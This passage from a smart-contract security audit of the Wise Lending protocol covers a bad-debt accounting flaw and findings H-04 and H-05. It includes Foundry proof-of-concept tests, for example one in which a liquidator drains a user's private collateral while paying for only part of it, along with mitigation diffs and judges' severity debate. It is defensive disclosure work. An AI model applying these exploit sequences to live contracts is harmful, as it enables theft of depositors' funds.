When bad debt is created, it is able to be paid back via theFeeManager::paybackBadDebtForTokenorFeeManager::paybackBadDebtNoRewardfunctions. However, the maximum amount of bad debt that can be deducted during these calls is capped at the bad debt recorded for the position specified (badDebtPosition[_nftId]). Therefore, the excess “fake” bad debt can not be deducted fromtotalBadDebtETH, resulting intotalBadDebtETHbeing permanently greater than0.
Below is the logic that deducts the bad debt created by a position when it is paid off via one of the payback functions mentioned above:
FeeManagerHelper::_updateUserBadDebt
170:unchecked{171:uint256newBadDebt=currentBorrowETH172:                -currentCollateralBareETH;173:174:_setBadDebtPosition(// @audit: badDebtPosition[_nftId] = newBadDebt175:_nftId,176:newBadDebt177:            );178:179:newBadDebt>currentBadDebt// @audit: totalBadDebtETH updated with respect to change in badDebtPosition180:                ?_increaseTotalBadDebt(newBadDebt-currentBadDebt)181:                :_decreaseTotalBadDebt(currentBadDebt-newBadDebt);
The above code is invoked in theFeeManagerHelper::updatePositionCurrentBadDebtfunction, which is in turn invoked during both of the payback functions previously mentioned. You will notice that the above code properly takes into account the change in the bad debt of the position in question. I.e. if thebadDebtPosition[_nftId]decreased (after being paid back), then thetotalBadDebtETHwill decrease as well. Therefore, thetotalBadDebtETHcan only be deducted by at most the current bad debt of a position. Returning to the previous example in Scenario 1, this means thattotalBadDebtETHwould remain equal tox, since onlyyamount of bad debt can be paid back.
Impact
In the event a position creates bad debt, partial liquidations of that position can lead to the globaltotalBadDebtETHstate variable being artificially inflated. This additional “fake debt” can not be deducted from the global state when the actual bad debt of the position is paid back. Thus, theFeeManager::claimFeesBeneficialfunction will be permanently DOS-ed, preventing anybeneficialsfrom claiming fees in theFeeManagercontract. Additionally, no new incentives are able to be distributed toincentive ownersin this state. However, protocol fees can still be collected in this state via the permissionlessFeeManager::claimWiseFeesfunction, and sinceincentive ownersandbeneficialsare the only entities able to claim these fees, this can lead to fees being permanently locked in theFeeManagercontract.
Justification for Medium Severity
Although not directly affecting end users, the function of claiming beneficial fees and distributing new incentives will be permanently bricked. To make matters worse, anyone can continue to collect fees via the permissionlessFeeManager::claimWiseFeesfunction, which will essentially “burn” any pending or future fees by locking them in theFeeManager(assuming all previously gathered incentives have been claimed). This value is, therefore, leaked from the protocol every time additional fees are collected in this state.
Once this state is reached, any pending or future fees should ideally be left in theWiseLendingcontract, providing value back to the users instead of allowing that value to be unnecessarily “burned”. However, the permissionless nature of theFeeManager::claimWiseFeesfunction allows bad actors to further grief the protocol during this state by continuing to collect fees.
Note: Once this state is reached, andWiseLendingis made aware of the implications, all fees (for all pools) can be set to0by themasteraddress. This would ensure that no future fees are sent to theFeeManager. However, this does not stop pending fees from being collected. Additionally, a true decentralized system (such as a DAO) would likely have some latency between proposing such a change (decreasing fee value) and executing that change. Therefore, any fees distributed during that period can be collected.
Proof of Concept
Place the following test in thecontracts/directory and run withforge test --match-path contracts/BadDebtTest.t.sol:
// SPDX-License-Identifier: -- WISE --pragmasolidity=0.8.24;import"./WiseLendingBaseDeployment.t.sol";contractBadDebtTestisBaseDeploymentTest{addressborrower=address(0x01010101);addresslender=address(0x02020202);uint256depositAmountETH=10e18;// 10 etheruint256depositAmountToken=10;// 10 etheruint256borrowAmount=5e18;// 5 etheruint256nftIdLiquidator;// nftId of lenderuint256nftIdLiquidatee;// nftId of borroweruint256debtShares;function_setupIndividualTest()internaloverride{_deployNewWiseLending(false);// set token value for simple calculationsMOCK_CHAINLINK_2.setValue(1ether);// 1 token == 1 ETHassertEq(MOCK_CHAINLINK_2.latestAnswer(),MOCK_CHAINLINK_ETH_ETH.latestAnswer());vm.stopPrank();// fund lender and borrowervm.deal(lender,depositAmountETH);deal(address(MOCK_WETH),lender,depositAmountETH);deal(address(MOCK_ERC20_2),borrower,depositAmountToken*2);}functiontestScenario1()public{// --- scenario is set up --- //_setUpScenario();// --- shortfall event/crash creates bad debt, position partially liquidated logging bad debt --- //_marketCrashCreatesBadDebt();// --- borrower gets partially liquidated again --- //vm.prank(lender);LENDING_INSTANCE.liquidatePartiallyFromTokens(nftIdLiquidatee,nftIdLiquidator,address(MOCK_WETH),address(MOCK_ERC20_2),debtShares*2e16/1e18);// --- global bad det increases again, but user bad debt is set to current bad debt created --- //uint256newTotalBadDebt=FEE_MANAGER_INSTANCE.totalBadDebtETH();uint256newUserBadDebt=FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);assertGt(newUserBadDebt,0);// userBadDebt reset to new bad debt, newUserBadDebt == current_bad_debt_createdassertGt(newTotalBadDebt,newUserBadDebt);// global bad debt incremented again// newTotalBadDebt = old_global_bad_debt + current_bad_debt_created// --- user bad debt is paid off, but global bad is only partially paid off (remainder is fake debt) --- //_tryToPayBackGlobalDebt();// --- protocol fees can no longer be claimed since totalBadDebtETH will remain > 0 --- //vm.expectRevert(bytes4(keccak256("ExistingBadDebt()")));FEE_MANAGER_INSTANCE.claimFeesBeneficial(address(0),0);}functiontestScenario2()public{// --- scenario is set up --- //_setUpScenario();// --- shortfall event/crash creates bad debt, position partially liquidated logging bad debt --- //_marketCrashCreatesBadDebt();// --- Position manipulated so second partial liquidation results in totalBorrow == bareCollateral --- //// borrower adds collateralvm.prank(borrower);LENDING_INSTANCE.solelyDeposit(nftIdLiquidatee,address(MOCK_ERC20_2),6);// borrower gets partially liquidated againvm.prank(lender);LENDING_INSTANCE.liquidatePartiallyFromTokens(nftIdLiquidatee,nftIdLiquidator,address(MOCK_WETH),address(MOCK_ERC20_2),debtShares*2e16/1e18);uint256collateral=SECURITY_INSTANCE.overallETHCollateralsBare(nftIdLiquidatee);uint256debt=SECURITY_INSTANCE.overallETHBorrowBare(nftIdLiquidatee);assertEq(collateral,debt);// LTV == 100% exactly// --- global bad debt is unchanged, while user bad debt is reset to 0 --- //uint256newTotalBadDebt=FEE_MANAGER_INSTANCE.totalBadDebtETH();uint256newUserBadDebt=FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);assertEq(newUserBadDebt,0);// user bad debt reset to 0assertGt(newTotalBadDebt,0);// global bad debt stays the same (fake debt)// --- attempts to pay back fake global debt result in a noop, totalBadDebtETH still > 0 --- //uint256paybackShares=_tryToPayBackGlobalDebt();assertEq(LENDING_INSTANCE.userBorrowShares(nftIdLiquidatee,address(MOCK_WETH)),paybackShares);// no shares were paid back// --- protocol fees can no longer be claimed since totalBadDebtETH will remain > 0 --- //vm.expectRevert(bytes4(keccak256("ExistingBadDebt()")));FEE_MANAGER_INSTANCE.claimFeesBeneficial(address(0),0);}function_setUpScenario()internal{// lender supplies ETHvm.startPrank(lender);nftIdLiquidator=POSITION_NFTS_INSTANCE.mintPosition();LENDING_INSTANCE.depositExactAmountETH{value:depositAmountETH}(nftIdLiquidator);vm.stopPrank();// borrower supplies collateral token and borrows ETHvm.startPrank(borrower);MOCK_ERC20_2.approve(address(LENDING_INSTANCE),depositAmountToken*2);nftIdLiquidatee=POSITION_NFTS_INSTANCE.mintPosition();LENDING_INSTANCE.solelyDeposit(// supply collateralnftIdLiquidatee,address(MOCK_ERC20_2),depositAmountToken);debtShares=LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee,borrowAmount);// borrow ETHvm.stopPrank();}function_marketCrashCreatesBadDebt()internal{// shortfall event/crash occursvm.prank(MOCK_DEPLOYER);MOCK_CHAINLINK_2.setValue(0.3ether);// borrower gets partially liquidatedvm.startPrank(lender);MOCK_WETH.approve(address(LENDING_INSTANCE),depositAmountETH);LENDING_INSTANCE.liquidatePartiallyFromTokens(nftIdLiquidatee,nftIdLiquidator,address(MOCK_WETH),address(MOCK_ERC20_2),debtShares*2e16/1e18+1);vm.stopPrank();// global and user bad debt is increaseduint256totalBadDebt=FEE_MANAGER_INSTANCE.totalBadDebtETH();uint256userBadDebt=FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);assertGt(totalBadDebt,0);assertGt(userBadDebt,0);assertEq(totalBadDebt,userBadDebt);// user bad debt and global bad debt are the same}function_tryToPayBackGlobalDebt()internalreturns(uint256paybackShares) {// lender attempts to pay back global debtpaybackShares=LENDING_INSTANCE.userBorrowShares(nftIdLiquidatee,address(MOCK_WETH));uint256paybackAmount=LENDING_INSTANCE.paybackAmount(address(MOCK_WETH),paybackShares);vm.startPrank(lender);MOCK_WETH.approve(address(FEE_MANAGER_INSTANCE),paybackAmount);FEE_MANAGER_INSTANCE.paybackBadDebtNoReward(nftIdLiquidatee,address(MOCK_WETH),paybackShares);vm.stopPrank();// global bad debt and user bad debt updateduint256finalTotalBadDebt=FEE_MANAGER_INSTANCE.totalBadDebtETH();uint256finalUserBadDebt=FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);assertEq(finalUserBadDebt,0);// user has no more bad debt, all paid offassertGt(finalTotalBadDebt,0);// protocol still thinks there is bad debt}}
Recommended Mitigation Steps
I would recommend updatingtotalBadDebtETHwith thedifferenceof the previous and new bad debt of a position in theWiseSecurity::checkBadDebtLiquidationfunction, similar to how it is done in theFeeManagerHelper::_updateUserBadDebtinternal function.
Example implementation:
diff --git a/./WiseSecurity/WiseSecurity.sol b/./WiseSecurity/WiseSecurity.solindex d2cfb24..75a34e8 100644--- a/./WiseSecurity/WiseSecurity.sol+++ b/./WiseSecurity/WiseSecurity.sol@@ -424,14 +424,22 @@ contract WiseSecurity is WiseSecurityHelper, ApprovalHelper {uint256 diff = totalBorrow- bareCollateral;-            FEE_MANAGER.increaseTotalBadDebtLiquidation(-                diff-            );+            uint256 currentBadDebt = FEE_MANAGER.badDebtPosition(_nftId);FEE_MANAGER.setBadDebtUserLiquidation(_nftId,diff);++            if (diff > currentBadDebt) {+                FEE_MANAGER.increaseTotalBadDebtLiquidation(+                    diff - currentBadDebt+                );+            } else {+                FEE_MANAGER.decreaseTotalBadDebtLiquidation(+                    currentBadDebt - diff+                );+            }}}
Trust (judge) increased severity to High
vonMangoldt (Wise Lending) commented via duplicate issue #243:
This doesn’t lead to loss of user funds though. Hence, it should be downgraded since one could just migrate and redeploy after discovering that. Otherwise good find.
Foon256 (Wise Lending) commented via duplicate issue #243:
Would agree with that! This is a good insight, but users’ funds are never at risk. This is related to thefeeManagerand the fees taken from the protocol. Therefore, a Medium issue.
Alex the Entreprenerd (Appellate Court judge) commented:
Summary of the issueWhen a market accrues bad debt, which can be inflated due to an accounting error, fees and incentives will no longer be distributed.Note: The discussion had quite a bit of back and forth, for this reason the whole conversation is pasted below:DiscussionAlex the Entreprenerd (Appellate Court lead judge) commented:This seems to be tied to a specific interpretation of this discussion we’ve had around loss of yield as high.hickuphh3 (judge 2) commented:Fees would be considered as matured yield? Given that it extends beyond the protocol to beneficials and incentive owners, I’m leaning towards a high more than a medium.Alex the Entreprenerd (Appellate Court lead judge) commented:Yes it would be considered matured. I don’t have an opinion on this report yet and will follow up later today with my notes.Not fully made up my mind but here’s a couple of points:For Medium: Loss of Yield -> There is no loss of principal so Med seems fine.For High: The contract is not losing yield in some case, the contract is losing 100% of all yield. The contract is no longer serving it’s purpose.External Conditions: Bad debt must be formed. Bad debt handling is part of the system design, so assuming this can happen is fair, and starting from a scenario in which this can happen is also fair.That said, in reality, this may never happen.My main point for downgrading is that while the contract is losing all of the yield, nothing beside that is impacted, not fully sure on this one.LSDan (judge 3) commented:I’m aligned with high on this one. Even though the conditions that lead to it are rare and there are arguably external conditions in some scenarios, there is a direct loss of funds and the functional loss of a contract’s purpose. Once this situation occurs, there is no clean way back from it.Alex the Entreprenerd (Appellate Court lead judge) commented:I think this is the issue where we will have some contention. I think the Sponsor interpretation is important to keep in mind as it’s pretty rational. I would like to think about it a bit more.Alex the Entreprenerd (Appellate Court lead judge) commented:I’m leaning towards Med on this report, I think the Sponsors POV is valid.There is an accounting error, it would not cause permanent loss of funds. It would be mitigated by deprecating the market and creating a new one.My main argument is that if this was live, this would trigger a re-deploy but it would not trigger any white hat rescue operation, as funds would be safe.hickuphh3 (judge 2) commented:#74: When we stick to the c4a rules to which we agreed, all the loss of fees are no user funds and therefore, should be treated differently.The core argument for Medium severity is that fees are a secondary concern.This goes against the supreme court decision where fees shouldn’t be treated as 2nd class citizenshere.Loss of fees should be regarded as an impact similar to any other loss of capital. Loss of real amounts depends on specific conditions and likelihood considerations.Likelihood: Requirement of bad debt formation. Once there is, funds (fees) are permanently bricked.There is an accounting error, it would not cause permanent loss of funds; it would be mitigated by deprecating the market and creating a new one.The funds you are referring to are user funds? Separately, I don’t see how it would mitigate the bricking once it happens.Alex the Entreprenerd (Appellate Court lead judge) commented:I don’t think that the ruling means that loss of fees should be treated as high at all times.The main argument is that the broken accounting doesn’t create a state that is not recoverable:Some fees are lost.User deprecates market (raises interests or pauses).Deployes new Market.System resumes functioning as intended.My main argument is that this would not cause a War Room, it would cause a deprecation that the system can handle.hickuphh3 (judge 2) commented:In what cases/scenarios would loss of fees be high then? Most, if not all, won’t have a war room for protocol fees.The reason I would consider to justify downgrading is the low likelihood of the external requirement of bad debt formation+>=2 partial liquidations.I would dissent and argue for high severity.Permanent loss of unclaimed fees.Blast radius: affects not just the protocol, but incentive owners and beneficiaries.Had the fees gone only to the protocol, I’d lean a bit more towards Medium.IsWiseLendingimmutable in apoolTokeninstance?What contracts would have to be re-deployed?Alex the Entreprenerd (Appellate Court lead judge) commented:Liquidation premium being denied could be a valid High loss of yield, loss of gas for refunds when the system entire goal is that (e.g. keepers, voting on Nouns).Alex the Entreprenerd’s (Appellate Court lead judge) InputThe finding shows how in the specific case of liquidations with bad debt, a market will stop accounting for fees.2 aggravating circumstances seem to be:Inability to pause and replace each market.The Math for bad debt is also wrong, leading to the inability to fix the bug.This would still cause a loss of fees for a certain period of time, as the admin would eventually be able to set the market fees to either a state that would cause users to stop using it or0as a means to stop the loss.I think that the accounting mistake is notable, and I understand the reasoning for raising severity.That said, because we have to judge by impact of the finding, I believe Medium Severity to be most appropriate.hickuphh3’s (judge 2) InputI maintain my stance for High severity for the reasons I stated above:Permanent loss of unclaimed fees.Impact on protocol ecosystem: beneficiaries and incentive owners.LSDan’s (judge 3) InputI’m still of the opinion that High is most appropriate here. The impact is significant enough that raising the severity beyond medium makes sense.DeliberationThe severity is kept at High Severity, with a non-unanimous verdict.Additional Context by the Lead JudgeI recommend monitoring how this decision influences future decisions on severities, especially when it comes to a percentage loss of yield, an attacker having the button to cause a loss of yield, against this instance which is the permanent inability for the contract to record a gain of yield.
Wise Lending commented:
Mitigatedhere.

[H-04] Liquidators can pay less than required to completely liquidate the private collateral balance of an uncollateralized position
Submitted bynonseodion
When a user deposits in theWiseLendingcontract he can make a private deposit (pure) which allows his deposits not to be used as collateral or a normal deposit. He can also set his position to be collateralized or uncollateralized. If a position is collateralized, the normal deposit can be used as collateral and vice-versa.
When a user uncollateralizes his position, he can only use his private deposit as collateral. If the position becomes liquidatable, it means the private deposit can no longer cover the amount borrowed. In the call togetFullCollateralETH()below only the private collateral is returned immediately as full collateral if it is uncollateralized.
WiseSecurityHelper.sol#L198-L208
ethCollateral=_getTokensInEth(_poolToken,WISE_LENDING.getPureCollateralAmount(_nftId,_poolToken));❌if(_isUncollateralized(_nftId,_poolToken) ==true) {returnethCollateral;}
In a liquidation, the amount to be liquidated is expressed as a percentage of the full collateral. In an uncollateralized position, the full collateral is the private collateral. ThecalculateWishPercentage()call calculates this percentage.
WiseSecurityHelper.sol#L760-L786
functioncalculateWishPercentage(uint256_nftId,address_receiveToken,uint256_paybackETH,uint256_maxFeeETH,uint256_baseRewardLiquidation)externalviewreturns(uint256){uint256feeETH=_checkMaxFee(_paybackETH,_baseRewardLiquidation,_maxFeeETH);uint256numerator= (feeETH+_paybackETH)*PRECISION_FACTOR_E18;uint256denominator=getFullCollateralETH(_nftId,_receiveToken);returnnumerator/denominator+1;}
The amount to be liquidated, i.e. the amount the liquidator receives, is calculated in_calculateReceiveAmount()using the percentage fromcalculateWishPercentage()and applied to the position’s pure collateral first in line 557 below.
It calculates the percentage of the user’s normal balance to be reduced in line 569 without checking if it is uncollateralized. If the amount it gets, i.e.potentialPureExtraCashout, is greater than zero and less than the current private balance (pureCollateral) in line 576, it is reduced from the private balance.
WiseCore.sol#L564-L586
556:if(pureCollateralAmount[_nftId][_receiveTokens] >0) {557:receiveAmount=_withdrawPureCollateralLiquidation(558:_nftId,559:_receiveTokens,560:_removePercentage561:             );562:         }563:564:uint256potentialPureExtraCashout;565:uint256userShares=userLendingData[_nftId][_receiveTokens].shares;566:uint256pureCollateral=pureCollateralAmount[_nftId][_receiveTokens];567:568:if(pureCollateral>0&&userShares>0) {569:potentialPureExtraCashout=_calculatePotentialPureExtraCashout(570:userShares,571:_receiveTokens,572:_removePercentage573:             );574:         }575:576:if(potentialPureExtraCashout>0&&potentialPureExtraCashout<=pureCollateral) {577:_decreasePositionMappingValue(578:pureCollateralAmount,579:_nftId,580:_receiveTokens,581:potentialPureExtraCashout582:             );583:584:_decreaseTotalBareToken(585:_receiveTokens,586:potentialPureExtraCashout587:             );588:589:returnreceiveAmount+potentialPureExtraCashout;590:         }591:
The issue is the implementation applies the percentage meant for only the private collateral to both the normal and private collateral. It should reduce only the private collateral, but may also reduce the public collateral and send it to the liquidator.
Here’s how a malicious liquidator can profit and steal user funds:
User deposits$100worth of WETH in his private balance and$100worth of WETH in his normal balance.He uncollateralizes his position and borrows$70worth of WBTC.If the price of WBTC he borrowed goes up to$100, he can be liquidated.Assuming no liquidation fees, the liquidator pays$50WBTC to liquidate$50WETH (50%) from the user’s private balance leaving$50.The 50% is applied to the user’s public balance giving$50. This is also deducted from the private balance leaving$0in the private balance.The liquidator ends up paying only$50to earn$50extra.
A liquidator can set it up to drain the private collateral balance and only pay for a portion of the liquidation. The user ends up losing funds and the protocol’s bad debt increases.
Impact
This vulnerability allows the liquidator to steal the user’s balance and pay for only a portion of the shares. It has these effects:
The user loses funds.The amount of bad debt in the protocol is increased.
Proof of Concept
ThetestStealPureBalance()test below shows a liquidator earning more than the amount he paid for liquidation.
The test can be put in any test file in thecontractsdirectory and ran there.
pragmasolidity=0.8.24;import"forge-std/Test.sol";import{WiseLending,PoolManager}from"./WiseLending.sol";import{TesterWiseOracleHub}from"./WiseOracleHub/TesterWiseOracleHub.sol";import{PositionNFTs}from"./PositionNFTs.sol";import{WiseSecurity}from"./WiseSecurity/WiseSecurity.sol";import{AaveHub}from"./WrapperHub/AaveHub.sol";import{Token}from"./Token.sol";import{TesterChainlink}from"./TesterChainlink.sol";import{IPriceFeed}from"./InterfaceHub/IPriceFeed.sol";import{IERC20}from"./InterfaceHub/IERC20.sol";import{IWiseLending}from"./InterfaceHub/IWiseLending.sol";import{ContractLibrary}from"./PowerFarms/PendlePowerFarmController/ContractLibrary.sol";contractWiseLendingTestisTest,ContractLibrary{WiseLendingwiseLending;TesterWiseOracleHuboracleHub;PositionNFTspositionNFTs;WiseSecuritywiseSecurity;AaveHubaaveHub;TesterChainlinkwbtcOracle;// users/adminaddressalice=address(1);addressbob=address(2);addresscharles=address(3);addresslendingMaster;//tokensaddresswbtc;functionsetUp()public{lendingMaster=address(11);vm.startPrank(lendingMaster);addressETH_PRICE_FEED=0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;addressUNISWAP_V3_FACTORY=0x1F98431c8aD98523631AE4a59f267346ea31F984;addressAAVE_ADDRESS=0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;// deploy oracle huboracleHub=newTesterWiseOracleHub(WETH,ETH_PRICE_FEED,UNISWAP_V3_FACTORY);oracleHub.setHeartBeat(oracleHub.ETH_USD_PLACEHOLDER(),// set USD/ETH feed heartbeat1);// deploy position NFTpositionNFTs=newPositionNFTs("PositionsNFTs","POSNFTS","app.wisetoken.net/json-data/nft-data/");// deploy Wiselending contractwiseLending=newWiseLending(lendingMaster,address(oracleHub),address(positionNFTs));// deploy AaveHubaaveHub=newAaveHub(lendingMaster,AAVE_ADDRESS,address(wiseLending));// deploy Wisesecurity contractwiseSecurity=newWiseSecurity(lendingMaster,address(wiseLending),address(aaveHub));wiseLending.setSecurity(address(wiseSecurity));// set labelsvm.label(address(wiseLending),"WiseLending");vm.label(address(positionNFTs),"PositionNFTs");vm.label(address(oracleHub),"OracleHub");vm.label(address(wiseSecurity),"WiseSecurity");vm.label(alice,"Alice");vm.label(bob,"Bob");vm.label(charles,"Charles");vm.label(wbtc,"WBTC");vm.label(WETH,"WETH");// create tokens, create TestChainlink oracle, add to oracleHub(wbtc,wbtcOracle) =_setupToken(18,17ether);oracleHub.setHeartBeat(wbtc,1);wbtcOracle.setRoundData(0,block.timestamp-1);// setup WETH on oracle huboracleHub.setHeartBeat(WETH,60minutes);oracleHub.addOracle(WETH,IPriceFeed(ETH_PRICE_FEED),newaddress[](0));// create poolswiseLending.createPool(PoolManager.CreatePool({allowBorrow:true,poolToken:wbtc,// btcpoolMulFactor:17500000000000000,poolCollFactor:805000000000000000,maxDepositAmount:1800000000000000000000000}));wiseLending.createPool(PoolManager.CreatePool({allowBorrow:true,poolToken:WETH,// btcpoolMulFactor:17500000000000000,poolCollFactor:805000000000000000,maxDepositAmount:1800000000000000000000000}));}function_setupToken(uintdecimals,uintvalue)internalreturns(addresstoken,TesterChainlinkoracle) {Token_token=newToken(uint8(decimals),alice);// deploy tokenTesterChainlink_oracle=newTesterChainlink(// deploy oraclevalue,18);oracleHub.addOracle(// add oracle to oracle hubaddress(_token),IPriceFeed(address(_oracle)),newaddress[](0));return(address(_token),_oracle);}functiontestStealPureBalance()public{// deposit WETH in private and public balances for Alice's NFTvm.startPrank(alice);deal(WETH,alice,100ether);IERC20(WETH).approve(address(wiseLending),100ether);uintaliceNft=positionNFTs.reservePosition();wiseLending.depositExactAmount(aliceNft,WETH,50ether);wiseLending.solelyDeposit(aliceNft,WETH,50ether);// deposit for Bob's NFT to provide WBTC liquidityvm.startPrank(bob);deal(wbtc,bob,100ether);IERC20(wbtc).approve(address(wiseLending),100ether);wiseLending.depositExactAmountMint(wbtc,100ether);// Uncollateralize Alice's NFT position to allow only private(pure)// balance to be used as collateralvm.startPrank(alice);wiseLending.unCollateralizeDeposit(aliceNft,WETH);(, ,uintlendCollFactor) =wiseLending.lendingPoolData(WETH);uintusableCollateral=50ether*lendCollFactor*95e16/1e36;// alice borrowsuintborrowable=oracleHub.getTokensFromETH(wbtc,usableCollateral) -1000;uintpaybackShares=wiseLending.borrowExactAmount(aliceNft,wbtc,borrowable);vm.startPrank(lendingMaster);// increase the price of WBTC to make Alice's position liquidatablewbtcOracle.setValue(20ether);// let charles get WBTC to liquidate Alicevm.startPrank(charles);uintcharlesNft=positionNFTs.reservePosition();uintpaybackAmount=wiseLending.paybackAmount(wbtc,paybackShares);deal(wbtc,charles,paybackAmount);IERC20(wbtc).approve(address(wiseLending),paybackAmount);uintwbtcBalanceBefore=IERC20(wbtc).balanceOf(charles);uintwethBalanceBefore=IERC20(WETH).balanceOf(charles);// charles liquidates 40% of the shares to ensure he can reduce the pure collateral balance twicewiseLending.liquidatePartiallyFromTokens(aliceNft,charlesNft,wbtc,WETH,paybackShares*40e16/1e18);uintwbtcBalanceChange=wbtcBalanceBefore-IERC20(wbtc).balanceOf(charles);uintwethBalanceChange=IERC20(WETH).balanceOf(charles) -wethBalanceBefore;// The amount of WETH Charles got is 2x the amount of WBTC he paid plus fees (10% of amount paid)// WBTC paid plus fees = 110% * wbtcBalanceChange// x2WBTCChangePlusFees = 2 * WBTC paid plus feesuintx2WBTCChangePlusFees=oracleHub.getTokensInETH(wbtc,11e17*wbtcBalanceChange/1e18) *2;assertApproxEqAbs(wethBalanceChange,x2WBTCChangePlusFees,200);}}
Recommended Mitigation Steps
To ensure the code does not also consider the normal balance at all we can check if the position is uncollateralized early. Currently, this check is done but is done too late in the_calculateReceiveAmount()function. We can fix it by moving the check.
WiseCore.sol#L560-L594
+if(userLendingData[_nftId][_receiveTokens].unCollateralized==true) {+returnreceiveAmount;+        }+uint256potentialPureExtraCashout;uint256userShares=userLendingData[_nftId][_receiveTokens].shares;uint256pureCollateral=pureCollateralAmount[_nftId][_receiveTokens];...-if(userLendingData[_nftId][_receiveTokens].unCollateralized==true) {-returnreceiveAmount;-        }-return_withdrawOrAllocateSharesLiquidation(_nftId,_nftIdLiquidator,
Assessed type
Invalid Validation
vm06007 (Wise Lending) commented:
Edge case - if user is about to be liquidated, I think they will make things collateralized to avoid liquidation. Either way we would like to see this as Medium. Fix is already applied. This is also something that’s been explored in the hats.finance competition; hence, 564-566 lines came from there etc.
Trust (judge) commented:
High is appropriate, especially with the PoC demonstrated.
Wise Lending commented:
Mitigatedhere.

[H-05] Wrong use ofnftIDto check if aPowerFarmposition is an Aave position
Submitted bynonseodion, also found by0xStalin
When aPowerFarmposition is created itskeyIdis used as a key in theisAavemapping to indicate if it is an Aave position or not. ThekeyIdis the index of the Power Farm NFT linked with the position.
PendlePowerManager.sol#L129-L130
isAave[keyId] =_isAave;
ThekeyIdis also linked with anothernftId. This othernftIdis used to hold thekeyIds Power Farm position in theWiseLendingcontract. They are linked together in thefarmingKeysmapping of theMinterReservercontract.
MinterReserver.sol#L88C1-L91C46
uint256keyId=_getNextReserveKey();reservedKeys[_userAddress] =keyId;farmingKeys[keyId] =_wiseLendingNFT;
The issue is the check if a position is an Aave position is done using theWiseLendingnftIdinstead of the Power Farm’skeyId. This occurs five times in the code:
It is used ingetLiveDebtRatio()to know the pool token borrowed so theborrowSharescan be retrieved.
PendlePowerFarm.sol#L64-L70
uint256borrowShares=isAave[_nftId]?_getPositionBorrowSharesAave(_nftId):_getPositionBorrowShares(_nftId);
It is used in_manuallyPaybackShares()to know the pool token to pay back.
PendlePowerFarm.sol#L127-L129
if(isAave[_nftId] ==true) {poolAddress=AAVE_WETH_ADDRESS;}
It is used incheckDebtRatio()to know the pool token borrowed so theborrowSharescan be retrieved.
PendlePowerFarmMathLogic.sol#L396-L402
❌uint256borrowShares=isAave[_nftId]?_getPositionBorrowSharesAave(_nftId):_getPositionBorrowShares(_nftId);
It is used in_coreLiquidation()to select a token to payback and to know the pool token borrowed so theborrowSharescan be retrieved.
PendlePowerFarmLeverageLogic.sol#L575-L590
❌addresspaybackToken=isAave[_nftId] ==true?AAVE_WETH_ADDRESS:WETH_ADDRESS;paybackAmount=WISE_LENDING.paybackAmount(paybackToken,_shareAmountToPay);❌uint256cutoffShares=isAave[_nftId] ==true?_getPositionBorrowSharesAave(_nftId)*FIVTY_PERCENT/PRECISION_FACTOR_E18:_getPositionBorrowShares(_nftId)*FIVTY_PERCENT/PRECISION_FACTOR_E18;
These have the following effects:
ForgetLiveDebtRatio(), users would get zero when they try to retrieve their debt ratio.For_manuallyPaybackShares()users won’t be able to pay back their shares manually from thePowerFarmcontract since it’ll fetch zero shares as borrow shares.The last two instances are used in liquidation and allow a malicious user to have a position that can’t be liquidated even though it is eligible for liquidation. The malicious user can:Create an AavePowerFarmposition.The position becomes eligible for liquidation after some price changes.Liquidators cannot liquidate the position because the call to_coreLiquidationfirst callscheckDebtRatio()which uses the wrongborrowSharesto calculate the debt ratio and returns true. Thus, causing a revert.
PendlePowerFarmLeverageLogic.sol#L571C1-L574C1
if(_checkDebtRatio(_nftId) ==true) {revertDebtRatioTooLow();}
Impact
Malicious users can open positions that can’t get liquidated.Users can’t pay back manually when it is an Aave position.getLiveDebtRatio()returns zero always when it is an Aave position.
Proof of Concept
There are 3 tests below and they can all be run inPendlePowerFarmControllerBase.t.sol.
testAaveGetLiveDebtRatio()shows thatgetLiveDebtRatio()returns zero.testAaveManuallyPayback()shows that borrowed tokens can’t be paid back usingmanuallyPaybackShares().testCannotLiquidate()shows that Aave positions cannot be liquidated.
functiontestAaveGetLiveDebtRatio()publiccheatSetup(true){_prepareAave();uint256keyID=powerFarmManagerInstance.enterFarm(true,1ether,15ether,entrySpread);uintnftId=powerFarmManagerInstance.farmingKeys(keyID);// gets borrow shares of weth instead of aethuintratio=powerFarmManagerInstance.getLiveDebtRatio(nftId);assertEq(ratio,0);}functiontestAaveManuallyPayback()publiccheatSetup(true){_prepareAave();uint256keyID=powerFarmManagerInstance.enterFarm(true,1ether,15ether,entrySpread);uintnftId=powerFarmManagerInstance.farmingKeys(keyID);uintborrowShares=wiseLendingInstance.getPositionBorrowShares(nftId,AWETH);// tries to payback weth instead of aweth and reverts with an arithmetic underflow// since the position has 0 weth borrow sharesvm.expectRevert();powerFarmManagerInstance.manuallyPaybackShares(keyID,borrowShares);}errorDebtRatioTooLow();functiontestCannotLiquidate()publiccheatSetup(true){_prepareAave();uint256keyID=powerFarmManagerInstance.enterFarm(true,1ether,15ether,entrySpread);// increase collateral factors to make position eligible for liquidationwiseLendingInstance.setPoolParameters(AWETH,99e16,type(uint256).max);// increasw Wiselending coll factorvm.store(address(powerFarmManagerInstance),bytes32(uint(2)),bytes32(uint(99e16)));//increasw PowerFarm coll factorassertEq(powerFarmManagerInstance.collateralFactor(),99e16);uintnftId=powerFarmManagerInstance.farmingKeys(keyID);uintborrowShares=wiseLendingInstance.getPositionBorrowShares(nftId,AWETH);// will revert if it can't be liquidatedwiseSecurityInstance.checksLiquidation(nftId,AWETH,borrowShares);uintnftIdLiquidator=positionNftsInstance.mintPosition();vm.expectRevert(DebtRatioTooLow.selector);powerFarmManagerInstance.liquidatePartiallyFromToken(nftId,nftIdLiquidator,borrowShares);}
Recommended Mitigation Steps
Consider checking if a position is an Aave position using thekeyIdof the position.
PendlePowerFarm.sol#L64-L70
-uint256borrowShares=isAave[_nftId]+uint256borrowShares=isAave[keyId]?_getPositionBorrowSharesAave(_nftId):_getPositionBorrowShares(_nftId);
PendlePowerFarm.sol#L127-L129
-if(isAave[_nftId] ==true) {+if(isAave[keyId] ==true) {poolAddress=AAVE_WETH_ADDRESS;}
PendlePowerFarmMathLogic.sol#L396-L402
